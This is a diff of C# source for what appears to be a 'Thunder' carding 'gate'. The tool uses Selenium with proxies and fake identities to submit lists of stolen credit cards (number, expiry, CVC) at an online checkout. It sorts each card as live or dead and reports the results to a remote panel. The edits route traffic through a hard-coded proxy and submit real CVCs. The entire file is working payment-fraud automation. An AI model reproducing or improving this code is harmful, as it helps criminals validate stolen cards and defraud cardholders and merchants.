@@ -6,6 +6,7 @@ using System.Net;
 using System.Threading;
 using System.Windows.Forms;
 using System.Windows.Forms.VisualStyles;
+using gateBeta;
 using gateBeta.gates;
 using Newtonsoft.Json;
 using OpenQA.Selenium;
@@ -35,7 +36,7 @@ namespace gateDanny.gates
             try
             {
                 string jsonString = "";
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                 request.Method = "GET";
                 request.Credentials = CredentialCache.DefaultCredentials;
                 ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
@@ -48,9 +49,7 @@ namespace gateDanny.gates
                 StreamReader sr = new StreamReader(response.GetResponseStream());
                 jsonString = sr.ReadToEnd();
                 sr.Close();
-                //MessageBox.Show(jsonString);
-                dynamic cc = JsonConvert.DeserializeObject(jsonString);
-                return cc.country.name;
+                return jsonString.Trim();
             }
             catch (Exception ex)
             {
@@ -120,45 +119,38 @@ namespace gateDanny.gates
         public void load()
         {
 
-            Socks socks = new Socks();
-            var prox = socks.proxy();
-
-            if (prox.Trim() == "0" || prox.Trim() == "")
+            if (Variables.nextSok == Variables.NumSocks)
             {
-                MessageBox.Show("No hay socks disponibles");
-                return;
+                Variables.nextSok = 0;
             }
 
-            var ip = prox.Split(':');
-            var ipUp = ip[1].ToString().Replace("//", "");
-
-
-            //var verifiProxy = check.ping(Variables.key, prox);
-            //if (verifiProxy == false)
-            //{
-            //    load();
-            //}
-
-
+            check.login(Variables.key);
             if (int.Parse(Variables.creditos) <= 0)
             {
                 MessageBox.Show("Recargue sus creditos");
                 return;
             }
 
-            var lines = Form1.listCC.Lines.Count();
-            if (lines > 0 && Variables.run==true)
+
+            ////if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "8")
             {
 
 
+
+
+                pagos = 0;
                 var chromeOptions = new ChromeOptions();
                 correo = "joseffernana" + getNum() + "@gmail.com";
                 clave = "Jo." + getNum();
 
-              
+
+
+
                 //chromeOptions.AddArguments(new List<string>() { "headless" });
                 //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
-                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--proxy-server=" + prox, "--ignore-certificate-errors");
+                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--ignore-certificate-errors", "--proxy-server=http://p.webshare.io:9999");
+
+                Variables.nextSok++;
 
                 var chromeDriverService = ChromeDriverService.CreateDefaultService();
                 chromeDriverService.HideCommandPromptWindow = true;
@@ -170,17 +162,17 @@ namespace gateDanny.gates
                 }
                 catch (Exception)
                 {
-                    socks.proxyUp(ipUp);
+                    
                     restart();
                 }
               
                  
-                Thread.Sleep(1000);
+         
 
 
                 if (IsElementPresent(By.XPath("//*[@id='main-message']/h1/span")))
                 {
-                    socks.proxyUp(ipUp);
+                   
                     restart();
                 }
 
@@ -188,7 +180,7 @@ namespace gateDanny.gates
                 {
                     if (driver.FindElement(By.XPath("/html/body")).Text.Trim() == "Backend not available")
                     {
-                        socks.proxyUp(ipUp);
+                       
                         restart();
                     }
                 }
@@ -197,7 +189,7 @@ namespace gateDanny.gates
                 {
                     if (driver.FindElement(By.XPath("/html/body/div/div[1]/h1")).Text.Trim() == "Custom Message")
                     {
-                        socks.proxyUp(ipUp);
+                     
                         restart();
                     }
                 }
@@ -206,7 +198,7 @@ namespace gateDanny.gates
                 {
                     if (driver.FindElement(By.XPath("/html/body/h2")).Text.Trim() == "502 Bad Gateway")
                     {
-                        socks.proxyUp(ipUp);
+                    
                         restart();
                     }
                 }
@@ -215,12 +207,12 @@ namespace gateDanny.gates
                 {
                     if (driver.FindElement(By.XPath("//*[@id='titles']/h1")).Text.Trim() == "ERROR")
                     {
-                        socks.proxyUp(ipUp);
+                       
                         restart();
                     }
                 }
 
-
+                Thunder._Form1.update_progresbar(5);
 
                 try
                 {
@@ -231,6 +223,7 @@ namespace gateDanny.gates
 
                         if (tiempoElemento(By.Id("first-name")))
                         {
+                            Thunder._Form1.update_progresbar(10);
                             driver.FindElement(By.Id("first-name")).SendKeys("DAVID");
                             Thread.Sleep(300);
                             driver.FindElement(By.Id("last-name")).SendKeys("REYES");
@@ -253,7 +246,7 @@ namespace gateDanny.gates
                             }
                             driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/div/div[2]/main/div/div/div[2]/form/div[3]/div[7]/div/div/input")).SendKeys("Ecuador");
                             Thread.Sleep(1000);
-                           
+                            Thunder._Form1.update_progresbar(50);
                             driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/div/div[2]/main/div/div/div[2]/form/div[3]/div[7]/div/div/div/div")).Click();
                             Thread.Sleep(1000);
                             driver.FindElement(By.Id("telephone")).SendKeys("0996269" + RandomNumber(100, 999).ToString());
@@ -294,13 +287,9 @@ namespace gateDanny.gates
                 }
                 catch (Exception ex)
                 {
-                    if (Variables.run == true)
+                    if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "8")
                     {
                         restart();
-                    }
-                    else
-                    {
-                        stop();
                     }
 
                    
@@ -310,6 +299,18 @@ namespace gateDanny.gates
             }
         }
 
+        public bool isAlertPresent()
+        {
+            try
+            {
+                driver.SwitchTo().Alert();
+                return true;
+            }   // try 
+            catch (NoAlertPresentException Ex)
+            {
+                return false;
+            }   // catch 
+        }
 
         private bool IsElementPresent(By by)
         {
@@ -350,10 +351,10 @@ namespace gateDanny.gates
         {
             try
             {
-                var lines = Form1.listCC.Lines.Count();
+               
 
 
-                if (lines > 0)
+                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "8")
                 {
                     if (pagos < 20)
                     {
@@ -363,7 +364,8 @@ namespace gateDanny.gates
                             restart();
                         }
 
-                        string cc = Form1.listCC.Lines[0];
+                        Thunder._Form1.update_progresbar(90);
+                        string cc = Thunder._Form1.nextCc();
                         string[] ccLine = cc.Split('|');
                         var ccnum = ccLine[0];
                         var ccmes = ccLine[1];
@@ -388,7 +390,7 @@ namespace gateDanny.gates
                             //    }
                             //    Thread.Sleep(300);
                             //}
-                            Form1.circularProgressBar1.Value = 90;
+                            Thunder._Form1.update_progresbar(90);
                             Thread.Sleep(200);
                             //driver.ExecuteJavaScript("document.querySelector('#cardnumber').value='" + ccnum + "'");
                             //driver.FindElement(By.Name("cardnumber")).SendKeys(ccnum);
@@ -416,16 +418,16 @@ namespace gateDanny.gates
                             }
                             Thread.Sleep(500);
 
-                            if (ccLine[3].Trim().Length == 3)
-                            {
-                                driver.FindElement(By.Name("cvc")).SendKeys("000");
-                            }
+                            //if (ccLine[3].Trim().Length == 3)
+                            //{
+                            //    driver.FindElement(By.Name("cvc")).SendKeys("000");
+                            //}
 
-                            if (ccLine[3].Trim().Length == 4)
-                            {
-                                driver.FindElement(By.Name("cvc")).SendKeys("0000");
-                            }
-
+                            //if (ccLine[3].Trim().Length == 4)
+                            //{
+                            //    driver.FindElement(By.Name("cvc")).SendKeys("0000");
+                            //}
+                            driver.FindElement(By.Name("cvc")).SendKeys(ccLine[3]);
 
                             Thread.Sleep(500);
 
@@ -445,28 +447,28 @@ namespace gateDanny.gates
 
                             if (confirmar())
                             {
-                                Form1.circularProgressBar1.Value = 100;
-                                var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
+                                Thunder._Form1.update_progresbar(100);
+                                var pais = checkbin(cc.Substring(0, 6));
+                                var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                                 check.ccss(Variables.key, guardar, "lives");
-                                Form1.textBox1.AppendText( cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
+                                Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                                 check.playlive();
                                 Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                                Form1.textBox1.AppendText(Environment.NewLine);
-                                Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                                Thunder._Form1.remove_cc(0, cc.Length);
                                 numeroTargeta++;
                                 pagos++;
                                 restart();
                             }
                             else
                             {
-                                Form1.circularProgressBar1.Value = 100;
-                                var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
+                                var pais = checkbin(cc.Substring(0, 6));
+                                Thunder._Form1.update_progresbar(100);
+                                var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                                 check.ccss(Variables.key, guardar, "deads");
                                 Thread.Sleep(300);
-                                Form1.textBox2.AppendText(cc );
+                                Thunder._Form1.agragar_dead(cc);
                                 Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                                Form1.textBox2.AppendText(Environment.NewLine);
-                                Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                                Thunder._Form1.remove_cc(0, cc.Length);
                                 numeroTargeta++;
                                 pagos++;
                                 pago();
@@ -487,13 +489,9 @@ namespace gateDanny.gates
             }
             catch (Exception ex)
             {
-                if (Variables.run == true)
+                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "8")
                 {
                     restart();
-                }
-                else
-                {
-                    stop();
                 }
             }
 
@@ -536,8 +534,9 @@ namespace gateDanny.gates
                         if (driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/section/div/div[2]/aside/div/div[4]/button")).Displayed == true)
                         {
                             {
-                                driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/section/div/div[2]/main/div/div/div/div[1]/div[2]/a")).Click();
-                                Thread.Sleep(2000);
+                                driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/section/div/div[2]/aside/div/div[4]/button")).Click();
+                                Thread.Sleep(8000);
+                                
                                 if (IsElementPresent(By.XPath("/html/body/div[1]/main/div[2]/div/div[2]/main/div/div/div/div/div/div[2]/div/div/form/div[2]/div[2]/a")))
                                 {
                                     
@@ -545,8 +544,12 @@ namespace gateDanny.gates
                                             Thread.Sleep(500);
                                              cambiarSock++;
                                             estado = "dead";
-                                        
-                                    
+
+
+                                }
+                                else
+                                {
+                                    estado = "live";
                                 }
                             }
                         }
